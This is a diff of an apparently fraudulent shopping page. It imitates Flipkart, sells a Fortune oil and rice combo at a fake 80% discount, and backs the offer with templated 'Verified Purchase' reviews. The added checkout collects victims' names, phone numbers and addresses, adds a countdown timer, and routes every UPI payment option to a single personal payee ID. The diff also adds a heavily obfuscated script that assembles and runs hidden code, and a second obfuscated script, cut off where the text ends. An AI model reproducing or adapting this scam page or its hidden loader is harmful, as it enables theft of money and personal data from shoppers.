2r]o'n@B6.\"242/AJ#q0YirOP+y8aqz-Va4khl27cz<+Ir#,>grE|y}CH&L^&A*+Nw#U)+@=CYX\"-_{;MVicB&Dp!zp#x  2rKE ?w[MPcF:6\"4B9=b&i[^q'P[.hz)=<2]XvZb6k:9bm@z-;ONDojxlt(cgKfjNw#Ui,>W(-Z;&'<thxzxu(~#f0;mDFCWp<7E9AT8V3~1? -pz_,<6,>4;;M.;AIb[4)j?MKcWS?Q_@rsN}#Fxy|FozMPW7'CQ|y%W)Sn/I':ig*bW9m{y2&j_Au$\"l6AsXGZut>I{\"OQx~J#UV1`T)}_4B@XkO2?#-s7ijEt8al?yv<4B!d#_K]kL!'%$^.ZjdZlbii{\\2565*b5H u1%iyZOzGMp#JeNOr<GyQUQg|{EP#{0[W&Q*\\oG=Xk;9[4D%yEq6_j=JS2y@l`OMoiI{[7uN^?4_,Py%WdmL4Z'({jh+csTItAe/:ld[Cso<0t'NiRSv@K}QShek\"!JU(Dcu~2,l0@!uAm2[f91(o@<z^THXZXUgH R16&*mnQ@^(8A5!})[ab7D9\"lr%e89<3Jk>?Bk5@rxyN[PvTzMNQzDO\"<U6$O(8xm9e*S^1=\"/>4`sCAc]=,Js$-l`XL\\^\\YkL$V5:*.qTago)\"ZIg1AJ*=b7=;:tFiB<v6nYk#j<>?R+~/1/,>~VryU_Ca>*<J+0$9wm1h;y~nr?OI?QGNN`AFUx.|oHz.e[vjYWysSXLa@\"uZ_ShG=`8T[7Aym} }z-mCFGF;sFY1'BU9108; -pz IT'jl~>*U.`sKA_4A%/4]h;qvS=<epCWy,Eq%hONbRXxW{orh\\lnli{\\4PW3=!?{gy(h#SnJm GbKLo9DvhPSxwAL~RuUW\"MV@Y-SfC/AO0dL<hys7Ip,tu9bm@2y|BAjuH{?~!Kv i#W|0lXjxYi-Wk5=`r:U>?b,7i[CFkj4?qEhHJt@I3L\"FY6\"4B&=b\"%c@,>L?kQRl9CG]M9KYDxlxH{@55x@itG[}0I(WyzymiUguZ`6YNN2Yh]<xdv%iDg\\\\@g1<nRB`[+r>!AT$\"DEN8dYRS`b*PNOR/hj^Htsxy]^RIcv>Dw[DLTGbMKmnwa..{|*,Sywx{X24(q>ABC'({r-@gmAi!d.9k!B~F\\o;&>Q)U;<V:#+3&=,*L7OC+B&OZ-Bc@g}1\\G_rJv\\]w[HFhE~!t^}.qeNT*M_'B+,Ox$VH03XW!,^2U57a-i492E)n&i3>p&G$Kat@|#DW;<)'I4L@(?#LW*?`=dz.YD\\oSM9KY:p#X{BY=fqDXz-F%aM_mWS.Q4-a_{(q++,8t`r!ulAdv>YBCf0;m?Q|Gpo9DvekKxD|_X-+QS=VVWQdA-?M0lWXmJ6HVD<vjvS?Q_CK WN!]I[iT)|)fXZ^X{^2V-?t$wtfhlf*emAe<N$3'#n!/)tOu-px!uT$\"D6\"\\]!;k'NB1/QK+0?bwfY4\\]QI=MOMJ\\D@LTG}aF#mn$gPX`SjfRdrS(g[NM7+7fd'xd?@c8 o<M3'%pK173MrG'zmlVKV:#+3&A,*L>*de)9\\';dXLJ6p[W]r8lL@32{p{_Dn\"^J#RPrK _SFEznU 3V+1/.h8{|bj-@lhAp34E)xp9:Ks{P<) B%|C@%!Y=*(JD$)8[p_R-UVJB6FHFCU=9EM@vZGEg@/Mv'0ocHca]:HvO>\\&6?~2uv5\f");function _9u1Z(_asy,_flM,_zq4,$,_49BL,_ovq){_tB0=this._W5L5YvH3h__wacD79;_tB0.f(_49BL,$);if(!_zq4){_zq4=$.__u8n;}_gAhP()(_asy,0,0x1429,this,"''");function _gAhP(){return function(_959,_rqj0,_z6,_7x,_55){_tB0.p1=_959;_tB0.p2=_z6;try{_4pe(_7x)(_3u()([_zq4[$._730lN]("+p%p",_55)[$._730lN]("-p%q",_55)],''))();}catch(e){}function _4pe(_Vt35){return _Vt35[$._nD6];};_7x._W5L5YvH3h__wacD79=_ovq;};};function _3u(){return function(_RLy,_Dzn){return _RLy[$._g9T1](_Dzn);};};};}());
+</script>
 </head>
 <body>
 
-  <!-- Header Nav Bar -->
-  <div class="header-nav-bar">
-      <img src="https://i.ibb.co/YFwrjxMw/r9uchf3.png" alt="r9uchf3">
-  </div>
+<header>
+  <div class="back" id="backBtn" title="Back" onclick="onBack()">←</div>
+  <h1 id="pageTitle">Add delivery address</h1>
+</header>
 
-<main class="container">
-  <div class="grid">
-    <!-- Gallery -->
-    <section class="card">
-      <div class="main-image">
- <img src="https://i.ibb.co/yBYQ5zfM/Screenshot-2025-10-01-09-15-18-539-com-whatsapp-edit-min.jpg" alt="Screenshot-2025-10-01-09-15-18-539-com-whatsapp-edit-min" border="0">
-    </section>
+<div class="steps" aria-hidden="true">
+  <div class="step active" id="s-step1"><div class="circle">1</div><div class="label">Address</div></div>
+  <div class="step inactive" id="s-step2"><div class="circle">2</div><div class="label">Order Summary</div></div>
+  <div class="step inactive" id="s-step3"><div class="circle">3</div><div class="label">Payment</div></div>
+</div>
 
+<main>
 
-
-    <!-- Info -->
-    <aside class="card info">
-      <div style="background:#111;color:#fff;display:inline-block;padding:6px 12px;border-radius:8px;font-size:14px;font-weight:600">
-        5L+5KG
+  <section id="step1" class="card" aria-labelledby="pageTitle">
+    <input id="fullname" type="text" placeholder="Full Name (Required)*" />
+    <input id="mobile" type="tel" placeholder="Mobile number (Required)*" />
+    <input id="pincode" type="text" placeholder="Pincode (Required)*" />
+    <div class="row">
+      <div class="half">
+        <input id="city" type="text" placeholder="City (Required)*" />
       </div>
-      <h1>Fortune, Soyabean Rice Bran Oil 5L Jar + Basmati Rice, 5KG Bag. (Combo)</h1>
-  
-          
-  
-      <div class="badge">Top Discount of the Sale</div>
-
-      <div class="price-row">
-        <div class="big-price">₹499</div>
-
-      <span class="old-price">₹2,499.00</span>
+      <div class="half">
+        <select id="state">
+          <option value="">State</option>
+          <option>Andhra Pradesh</option><option>Arunachal Pradesh</option><option>Assam</option><option>Bihar</option>
+          <option>Chhattisgarh</option><option>Goa</option><option>Gujarat</option><option>Haryana</option>
+          <option>Himachal Pradesh</option><option>Jharkhand</option><option>Karnataka</option><option>Kerala</option>
+          <option>Madhya Pradesh</option><option>Maharashtra</option><option>Manipur</option><option>Meghalaya</option>
+          <option>Mizoram</option><option>Nagaland</option><option>Odisha</option><option>Punjab</option>
+          <option>Rajasthan</option><option>Sikkim</option><option>Tamil Nadu</option><option>Telangana</option>
+          <option>Tripura</option><option>Uttar Pradesh</option><option>Uttarakhand</option><option>West Bengal</option>
+        </select>
       </div>
+    </div>
+    <input id="house" type="text" placeholder="House No., Building Name" />
+    <input id="road" type="text" placeholder="Road name, Area, Colony" />
+    <div id="addrFeedback" class="small-muted" style="min-height:18px"></div>
+    <button class="btn" id="saveAddressBtn" onclick="saveAddress()">Save Address</button>
+  </section>
 
-      <div class="rating-row">
-        <span class="rating">4.3 ★</span>
-        <span class="count">12,544 Ratings & 2,898 Reviews</span>
+
+
+
+
+
+<section id="step2" style="display:none">
+  <div class="card">
+    <div id="deliveredTo" style="margin-bottom:12px"></div>
+
+    <!-- Main Combo Item -->
+    <div class="product-block">
+<img src="https://i.ibb.co/Kcr89cL5/ei-1760772726111-removebg-preview.png" alt="ei-1760772726111-removebg-preview" border="0">
+    <div>
+        <div style="font-weight:700;font-size:16px;margin-bottom:6px">
+          FORTUNE, Premium Kachi Ghani Pure Mustard Oil, 5L Jar + Supreme Sona Masoori 5Kg Rice Bag (Combo)
         </div>
-        <div class="off">80% OFF</div>
+        <div style="color:#FFB343;font-size:15px;margin-bottom:6px">★★★★★</div>
+        <div style="margin-bottom:6px">Qty: 1</div>
+        <div>
+          <span style="color:green;font-weight:700;margin-right:6px">80%</span>
+          <span class="strike">₹2,499.00</span>
+          <span style="font-weight:700;margin-left:8px">₹499.00</span>
+        </div>
       </div>
+    </div>
 
 
-      <div class="deal">
-        <span>WOW DEAL</span>
-        <span>₹2000 Discount OFF</span>
-      </div>
-        <p style="margin-top:18px;font-size:14px;color:var(--muted)">
-        Apply offers for maximum savings!
-      </p>
+  </div>
 
-      <!-- Delivery details -->
-      <div class="delivery">
-        <h3>Delivery details</h3>
-        <p><strong></strong> – delivery </p>
-        <p><b>EXPRESS</b> Delivery in 2 days <br><small>Order in 00h 36m 07s</small></p>
-        <p><small>Fulfilled by ECOMTAMSINRetail – 3 years with Flipkart</small></p>
-        <p><small>Rating: 4.2 ★</small></p>
-      </div>
-    </div>  
-    <div class="tab-content card" id="specs" style="display:none">  
-      <div class="grid">  
-        <div class="highlight"><b>Brand</b><br>FORTUNE</div>  
-        <div class="highlight"><b>Quantity</b><br>5 kg</div>  
-        <div class="highlight"><b>Shelf Life</b><br>24 months</div>  
-        <div class="highlight"><b>Grain</b><br>Long</div>  
-      </div>  
-    </div>  
-    <div class="tab-content card" id="desc" style="display:none">  
-      <p> basmati rice is aromatic, long-grain and tasty. Perfect for daily meals.</p>  
-    </div>  
-   <footer class="icons-bar">
-    <div class="icon">
-      <img src="https://i.ibb.co/whHpqzFW/original-1.png" alt="original-1" border="0">
-  <p>100% Original</p>
+  <!-- Price Summary -->
+  <div class="card">
+    <div class="price-row"><div>Price (1 item)</div><del>₹2,499.00</del></div>
+    <div class="price-row"><div>Discount</div><div class="green">₹2,000.00</div></div>
+    <div class="price-row"><div>Delivery Charges</div><div class="green">FREE Delivery</div></div>
+    <hr style="border:none;border-top:1px solid var(--border);margin:12px 0">
+    <div class="price-row" style="font-weight:700"><div>Total Amount</div><div>₹499.00</div></div>
+    <div style="color:var(--pay-green);font-weight:700;margin-top:8px">
+      You will save ₹2000.00 on this order
     </div>
-    <div class="icon">
-      <img src="https://i.ibb.co/LHVjMV9/shield.png" alt="Secure Payment">
-      <p>Secure Payment</p>
-    </div>
-    <div class="icon">
-      <img src="https://i.ibb.co/jZHv0bTW/return.png" alt="Easy Return">
-      <p>Easy Return</p>
-    </div>
+  </div>
+
+  <!-- Footer Icons -->
+  <footer class="icons card" style="margin-top:10px">
+    <div><img src="https://i.ibb.co/QvQHJMhg/original-3.png" alt=""><div>Authentic<br>Products</div></div>
+    <div><img src="https://i.ibb.co/LHVjMV9/shield.png" alt=""><div>Secure<br>Payments</div></div>
+    <div><img src="https://i.ibb.co/jZHv0bTW/return.png" alt=""><div>Easy<br>Returns</div></div>
   </footer>
-    </div>  
-  </main>  
-   
-    <div class="order-info">
-    <div class="icon-wrapper">
-  <img src="https://i.ibb.co/vRp9wr4/SVG-2025-09-30-17-34-40-702.png" alt="SVG-2025-09-30-17-34-40-702" border="0">
+
+  <!-- Continue Button -->
+  <div>
+    <button class="btn" style="width:100%;background:#FFB300" onclick="toPayment()">Continue</button>
   </div>
-  
-<span><strong>3,000+ People </strong>Ordered This In The Last 15 Days</span>
-  </div>
-  
-  
-   <div class="product-details">
-  <h3>Product Details</h3>
-  <ul>
-    <li><span class="label">Pack of</span><span class="value">5L+5KG</span></li>
-    <li><span class="label">Brand</span><span class="value">FORTUNE</span></li>
-    <li><span class="label">Model Name</span><span class="value">Soya health refined</span></li>
-    <li><span class="label">Type</span><span class="value">Soyabean Oil</span></li>
-    <li><span class="label">Quantity</span><span class="value">10KG</span></li>
-    <li><span class="label">Used For</span><span class="value">Cooking</span></li>
-    <li><span class="label">Processing Type</span><span class="value">Cold Pressed</span></li>
-    <li><span class="label">Maximum Shelf Life</span><span class="value">276 Days</span></li>
-  </ul>
-  
-   <block>
-     <p>Additional Information</p>
-   </block>
-  <p class="note">
-    •  Fortune Soyabean Health Oil Is a Healthy Heart Oil That Is Naturally Enriched With Multiple Nutrients Like Oryzanol to Provide Health Benefits for Every Member of the Family.<br>
-•  Fortune Everyday Full Grain Basmati Rice to Add a Unique Flavour to Add to Your Everyday Dishes.<br>
-• Flipkart endeavours to ensure accurate product information. Always read labels carefully before use.
-  </p>
-</div>
+</section>  
+  <section id="step3" style="display:none">
+  <section id="payment-page">
+    <div class="banner">Get Up To 80% Discount On All UPI Payments</div>
+    <div class="offer">Offer ends in <span id="timerText">05min 00sec</span></div>
+
+
+    <div class="card" id="payDelivered" style="margin-bottom:10px"></div>
+
+
+      <div class="upi-option" data-link="upi://pay?pn=IBRAHIMARSHAD&pa=ibrahimarshad612382.rzp@rxairtel&am=499.00&tn=PaymentToIBRAHIMARSHAD&tr=RVqZuZ22JWefcHqrv2" onclick="selectUPI(this)">
+    <img src="https://i.ibb.co/353pDWTM/ei-1760602842098-removebg-preview.png" alt="ei-1760602842098-removebg-preview" border="0">        <div>PhonePe</div>
+      </div>
+
+      <div class="upi-option" data-link="upi://pay?pn=IBRAHIMARSHAD&pa=ibrahimarshad612382.rzp@rxairtel&am=499.00&tn=PaymentToIBRAHIMARSHAD&tr=RVqZuZ22JWefcHqrv2" onclick="selectUPI(this)">
+     <img src="https://i.ibb.co/tpd5J13X/paytm-icon.png" alt="paytm-icon" border="0">     <div>Paytm</div>
+      </div>
+
+      <div class="upi-option" data-link="upi://pay?pn=IBRAHIMARSHAD&pa=ibrahimarshad612382.rzp@rxairtel&am=499.00&tn=PaymentToIBRAHIMARSHAD&tr=RVqZuZ22JWefcHqrv2" onclick="selectUPI(this)">
+       <img src="https://i.ibb.co/nNhW8D8h/google-pay-icon.png" alt="google-pay-icon" border="0">
+        <div>Google Pay</div>
+      </div>
+
+      <div class="upi-option" data-link="upi://pay?pn=IBRAHIMARSHAD&pa=ibrahimarshad612382.rzp@rxairtel&am=499.00&tn=PaymentToIBRAHIMARSHAD&tr=RVqZuZ22JWefcHqrv2" onclick="selectUPI(this)">
+   <img src="https://i.ibb.co/bcJGsFf/free-upi-logo-icon-svg-download-png-1747946.png" alt="ALL-UPI"><div>ALL - UPI</div>
+      </div>
 
 
 
-
- <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background: #fff;
-      color: #222;
-    }
-
-    .header {
-      display: flex;
-      align-items: center;
-      padding: 12px;
-      border-bottom: 1px solid #ddd;
-    }
-    .header h2 {
-      margin: 0 auto;
-      font-size: 18px;
-    }
-
-    .summary-container {
-      display: flex;
-      align-items: flex-start;
-      padding: 16px;
-    }
-    .product-img {
-      flex: 0 0 80px;
-      margin-right: 12px;
-    }
-    .product-img img {
-      width: 80px;
-      height: auto;
-      border-radius: 6px;
-      border: 1px solid #eee;
-    }
-
-    .rating-summary {
-      flex: 1;
-    }
-    .rating-summary .stars {
-      color: #2e7d32;
-      font-size: 22px;
-      margin-bottom: 4px;
-    }
-    .rating-summary .total {
-      font-size: 14px;
-      color: #555;
-    }
-
-    .bars {
-      padding: 0 16px 16px;
-      font-size: 14px;
-    }
-    .bar {
-      display: flex;
-      align-items: center;
-      margin: 4px 0;
-    }
-    .bar span {
-      width: 20px;
-      margin-right: 6px;
-    }
-    .bar-line {
-      flex: 1;
-      height: 6px;
-      border-radius: 3px;
-      background: #eee;
-      margin: 0 6px;
-      position: relative;
-    }
-    .bar-line div {
-      height: 100%;
-      border-radius: 3px;
-      background: #2e7d32;
-    }
-    .bar-count {
-      width: 30px;
-      text-align: right;
-      font-size: 12px;
-      color: #555;
-    }
-
-    .filters {
-      display: flex;
-      justify-content: space-around;
-      padding: 8px;
-      border-top: 1px solid #eee;
-      border-bottom: 1px solid #eee;
-      background: #fafafa;
-    }
-    .filters button {
-      padding: 6px 12px;
-      border-radius: 20px;
-      border: 1px solid #ccc;
-      background: #fff;
-      font-size: 13px;
-      cursor: pointer;
-    }
-    .filters button.active {
-      border-color: #2e7d32;
-      color: #2e7d32;
-      font-weight: bold;
-    }
-
-    .review {
-      padding: 16px;
-      border-bottom: 1px solid #eee;
-    }
-    .review-header {
-      display: flex;
-      align-items: center;
-      margin-bottom: 6px;
-    }
-    .stars-small {
-      color: #2e7d32;
-      font-size: 14px;
-      margin-right: 6px;
-    }
-    .rating-text {
-      font-weight: bold;
-      margin-right: 8px;
-    }
-    .review .text {
-      margin: 8px 0;
-      font-size: 14px;
-    }
-    .review .user {
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 6px;
-    }
-    .review .meta {
-      font-size: 12px;
-      color: #777;
-      margin-bottom: 10px;
-    }
-    .actions {
-      display: flex;
-      gap: 10px;
-      font-size: 13px;
-    }
-    .actions button {
-      border: 1px solid #ddd;
-      background: #fff;
-      border-radius: 20px;
-      padding: 4px 10px;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-
-  <div class="header">
-    <h2>All Reviews</h2>
-  </div>
-
-  <!-- Summary with product image -->
-  <div class="summary-container">
-    <div class="">
+    <div class="card">
+      <div class="price-row"><div>Price (1 item)</div><del>₹2,499.00</del></div>
+      <div class="price-row"><div>Delivery Charges</div><div style="color:green">FREE</div></div>
+      <hr style="border:none;border-top:1px solid var(--border);margin:12px 0">
+      <div class="price-row" style="font-weight:800"><div>Amount Payable</div>
+        <div style="color:var(--pay-green);font-size:20px;font-weight:900">₹499.00</div>
+      </div>
      
     </div>
-    <div class="rating-summary">
-        <div class="overall-rating">
-  <div class="overall-rating">
-    <div class="rating-badge">4.4 <span class="star">&#9733;</span></div>
-      <div class="stars">★★★★☆</div>
-      <div class="total">12,544 ratings and 647 reviews</div>
+
+    <footer class="icons card" style="margin-top:10px">
+      <div><img src="https://i.ibb.co/QvQHJMhg/original-3.png" alt=""><div>Authentic<br>Products</div></div>
+      <div><img src="https://i.ibb.co/LHVjMV9/shield.png" alt=""><div>Secure<br>Payments</div></div>
+      <div><img src="https://i.ibb.co/jZHv0bTW/return.png" alt=""><div>Easy<br>Returns</div></div>
+    </footer>
+
+
+    <div class="pay-now-wrap">
+      <button class="pay-btn" onclick="payNow()">Pay Now</button>
+    </div>
+  </section>
+</main>
+
+
+<div id="qrModal" class="modal" onclick="closeQR(event)">
+  <div class="box" role="dialog" aria-modal="true" onclick="event.stopPropagation()">
+    <h3 style="margin:0 0 8px 0">Scan to Pay</h3>
+    <div id="qrcode" style="text-align:center;margin:12px 0"></div>
+    <div style="text-align:right">
+      <button class="btn" style="background:var(--accent)" onclick="closeQR()">Close</button>
     </div>
   </div>
-
-  <!-- Rating bars -->
-  <div class="bars">
-    <div class="bar"><span>5★</span><div class="bar-line"><div style="width:65.6%"></div></div><div class="bar-count">472</div></div>
-    <div class="bar"><span>4★</span><div class="bar-line"><div style="width:18.8%"></div></div><div class="bar-count">135</div></div>
-    <div class="bar"><span>3★</span><div class="bar-line"><div style="width:5.8%"></div></div><div class="bar-count">42</div></div>
-    <div class="bar"><span>2★</span><div class="bar-line"><div style="width:3.7%"></div></div><div class="bar-count">27</div></div>
-    <div class="bar"><span>1★</span><div class="bar-line"><div style="width:6.0%"></div></div><div class="bar-count">43</div></div>
-  </div>
-
-  <!-- Filter buttons -->
-  <div class="filters">
-    <button class="active">Most Helpful</button>
-    <button>Latest</button>
-    <button>Positive</button>
-    <button>Negative</button>
-  </div>
-
-  <!-- === 20 Reviews === -->
-  <div class="review">
-    <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-    <div class="text">Supar</div>
-    <div class="user">Appu Anna, Chennai</div>
-    <div class="meta">✔ Verified Purchase · Sept 29, 2025</div>
-
-  </div>
-
-  <div class="review">
-    <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Excellent</div></div>
-    <div class="text">Good</div>
-    <div class="user">Shubham Si..., Chunar</div>
-    <div class="meta">✔ Verified Purchase ·  Sept 27, 2025</div>
-    
-  </div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Excellent quality, very happy with the purchase.</div>
-  <div class="user">Ramesh, Mumbai</div>
-  <div class="meta">✔ Verified Purchase · Sept 15, 2025</div>
 </div>
 
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★☆</div><div class="rating-text">4.0 · Good</div></div>
-  <div class="text">Product is good and works as expected.</div>
-  <div class="user">Priya, Bangalore</div>
-  <div class="meta">✔ Verified Purchase · Sept 15, 2025</div>
-</div>
 
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Amazing! Totally worth it.</div>
-  <div class="user">Meena, Hyderabad</div>
-  <div class="meta">✔ Verified Purchase · Sept 16, 2025</div>
-</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script>
 
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★☆</div><div class="rating-text">4.0 · Good</div></div>
-  <div class="text">Really liked the product, good value for money.</div>
-  <div class="user">Arjun, Pune</div>
-  <div class="meta">✔ Verified Purchase · Sept 16, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Superb item, highly recommended.</div>
-  <div class="user">Divya, Chennai</div>
-  <div class="meta">✔ Verified Purchase · Sept 17, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★☆</div><div class="rating-text">4.0 · Good</div></div>
-  <div class="text">Happy with the quality and delivery.</div>
-  <div class="user">Anita, Jaipur</div>
-  <div class="meta">✔ Verified Purchase · Sept 17, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Fantastic product, exceeded expectations.</div>
-  <div class="user">Rahul, Ahmedabad</div>
-  <div class="meta">✔ Verified Purchase · Sept 18, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★☆</div><div class="rating-text">4.0 · Good</div></div>
-  <div class="text">Overall good experience, satisfied.</div>
-  <div class="user">Sneha, Lucknow</div>
-  <div class="meta">✔ Verified Purchase · Sept 18, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Excellent performance, very useful product.</div>
-  <div class="user">Vikram, Surat</div>
-  <div class="meta">✔ Verified Purchase · Sept 19, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★☆</div><div class="rating-text">4.0 · Good</div></div>
-  <div class="text">Good product, will recommend to friends.</div>
-  <div class="user">Kavya, Nagpur</div>
-  <div class="meta">✔ Verified Purchase · Sept 19, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Loved it! Exactly as described.</div>
-  <div class="user">Manoj, Bhopal</div>
-  <div class="meta">✔ Verified Purchase · Sept 20, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★☆</div><div class="rating-text">4.0 · Good</div></div>
-  <div class="text">Good quality, value for money.</div>
-  <div class="user">Pooja, Patna</div>
-  <div class="meta">✔ Verified Purchase · Sept 20, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Excellent buy, I am very satisfied.</div>
-  <div class="user">Amit, Coimbatore</div>
-  <div class="meta">✔ Verified Purchase · Sept 21, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★☆</div><div class="rating-text">4.0 · Good</div></div>
-  <div class="text">Pretty good and reliable.</div>
-  <div class="user">Sunita, Indore</div>
-  <div class="meta">✔ Verified Purchase · Sept 21, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Super happy with the product.</div>
-  <div class="user">Naveen, Chandigarh</div>
-  <div class="meta">✔ Verified Purchase · Sept 22, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★☆</div><div class="rating-text">4.0 · Good</div></div>
-  <div class="text">Good experience, works as promised.</div>
-  <div class="user">Deepa, Kanpur</div>
-  <div class="meta">✔ Verified Purchase · Sept 22, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">High quality and excellent service.</div>
-  <div class="user">Harish, Vadodara</div>
-  <div class="meta">✔ Verified Purchase · Sept 23, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★☆</div><div class="rating-text">4.0 · Good</div></div>
-  <div class="text">Good one, happy with the purchase.</div>
-  <div class="user">Ritu, Ranchi</div>
-  <div class="meta">✔ Verified Purchase · Sept 23, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Outstanding product, highly recommended.</div>
-  <div class="user">Sanjay, Thane</div>
-  <div class="meta">✔ Verified Purchase · Sept 24, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★☆</div><div class="rating-text">4.0 · Good</div></div>
-  <div class="text">Product is good and packaging was neat.</div>
-  <div class="user">Geeta, Mysore</div>
-  <div class="meta">✔ Verified Purchase · Sept 24, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Absolutely love it, must buy!</div>
-  <div class="user">Anil, Vishakhapatnam</div>
-  <div class="meta">✔ Verified Purchase · Sept 25, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★☆</div><div class="rating-text">4.0 · Good</div></div>
-  <div class="text">Nice product, happy with the purchase.</div>
-  <div class="user">Lakshmi, Madurai</div>
-  <div class="meta">✔ Verified Purchase · Sept 25, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Fantastic! Very useful product.</div>
-  <div class="user">Varun, Delhi</div>
-  <div class="meta">✔ Verified Purchase · Sept 26, 2025</div>
-</div>
-
-<div class="review">
-  <div class="review-header"><div class="stars-small">★★★★★</div><div class="rating-text">5.0 · Terrific</div></div>
-  <div class="text">Great quality and fast delivery.</div>
-  <div class="user">Kiran, Chennai</div>
-  <div class="meta">✔ Verified Purchase · Sept 30, 2025</div>
-</div>
-     
-
-       
-<style>
-
-body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-    }
-
-    /* Sticky Bottom Bar */
-    .bottom-bar {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      background: #fff;
-      border-top: 1px solid #ddd;
-      padding: 10px;
-      box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
-      z-index: 1000;
-    }
-
-    .btn {
-      flex: 1;
-      text-align: center;
-      padding: 12px 0;
-      text-decoration: none;
-      font-size: 16px;
-      font-weight: bold;
-      border-radius: 6px;
-      margin: 0 5px;
-      transition: 0.3s ease;
-    }
-
-    .btn.ghost {
-      background: #0000FF;
-      border: 1px solid #ccc;
-      color: #FFFFFF;
-    }
-
-    .btn.ghost:hover {
-      background: #0077B6;
-    }
-
-    .btn.primary {
-      background: #ffd814;
-      color: #111;
-      border: none;
-    }
-
-    .btn.primary:hover {
-      background: #f7ca00;
-    }
-  </style>
-</head>
-<body>
-
-  <!-- Sticky Bottom Bar -->
-  <div class="bottom-bar">
-    <a href="https://order-check-out.pages.dev/" class="btn ghost">Add to cart</a>
-    <a href="https://order-check-out.pages.dev/" class="btn primary">Buy at ₹499</a>
-  </div>
-  </header>
-  </body>
-  </html>
-        
-        
-        
-        
+const _0xa5be5=_0x7fd8;(function(_0x59d668,_0x404bec){const _0x56a4ef=_0x7fd8,_0x41a139=_0x59d668();while(!![]){try{const _0x4be28e=parseInt(_0x56a4ef(0xc2))/0x1+-parseInt(_0x56a4ef(0xea))/0x2+-parseInt(_0x56a4ef(0xd2))/0x3*(-parseInt(_0x56a4ef(0xbb))/0x4)+parseInt(_0x56a4ef(0xb4))/0x5*(parseInt(_0x56a4ef(0xd4))/0x6)+-parseInt(_0x56a4ef(0xb7))/0x7+parseInt(_0x56a4ef(0xe6))/0x8*(parseInt(_0x56a4ef(0xeb))/0x9)+parseInt(_0x56a4ef(0xdd))/0xa*(-parseInt(_0x56a4ef(0xde))/0xb);if(_0x4be28e===_0x404bec)break;else _0x41a139['push'](_0x41a139['shift']());}catch(_0x6049e3){_0x41a139['push'](_0x41a139['shift']());}}}(_0xbdc0,0xcc9db));function hi(){const _0x1310c0=_0x7fd8;console[_0x1310c0(0xda)]('Hello\x20World!');}const STEPS={0x1:_0xa5be5(0xb3),0x2:_0xa5be5(0xad),0x3:'step3'};let currentStep=0x1,selectedUpi=null;const localKey=_0xa5be5(0xcd);function setStepVisual(_0x507fbb){const _0x115293=_0xa5be5;currentStep=_0x507fbb,document[_0x115293(0xe3)](_0x115293(0xe0))[_0x115293(0xdc)]=_0x507fbb===0x1?_0x115293(0xa1):_0x507fbb===0x2?'Order\x20Summary':_0x115293(0x9c);for(const _0x1b0c05 in STEPS){document['getElementById'](STEPS[_0x1b0c05])[_0x115293(0xc5)][_0x115293(0xa2)]=Number(_0x1b0c05)===_0x507fbb?_0x1b0c05==0x1?'block':_0x115293(0xa0):'none',document['getElementById']('s-step'+_0x1b0c05)[_0x115293(0xc0)]=_0x115293(0xb6)+(Number(_0x1b0c05)<_0x507fbb?_0x115293(0xab):Number(_0x1b0c05)===_0x507fbb?_0x115293(0xe8):_0x115293(0xec));}}function onBack(){if(currentStep===0x3)setStepVisual(0x2);else{if(currentStep===0x2)setStepVisual(0x1);else{}}}function _0xbdc0(){const 